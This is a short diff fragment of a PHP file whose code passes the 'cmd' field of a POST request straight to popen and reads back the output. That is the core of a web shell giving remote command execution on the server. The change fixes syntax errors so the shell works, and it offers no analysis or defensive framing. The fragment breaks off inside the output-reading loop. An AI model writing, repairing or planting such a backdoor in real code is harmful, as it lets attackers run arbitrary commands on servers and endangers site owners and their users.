@@ -1,7 +1,7 @@
 <?php
-if($_POST['cmd']!="php_eval"))
+if($_POST['cmd']!="php_eval")
 {
-	$f = @popen($_POST['cmd'],"r")
+	$f = @popen($_POST['cmd'],"r");
     $res = "";
     while(!feof($f)) { 
 	    $res .= @fread($f,1024); 
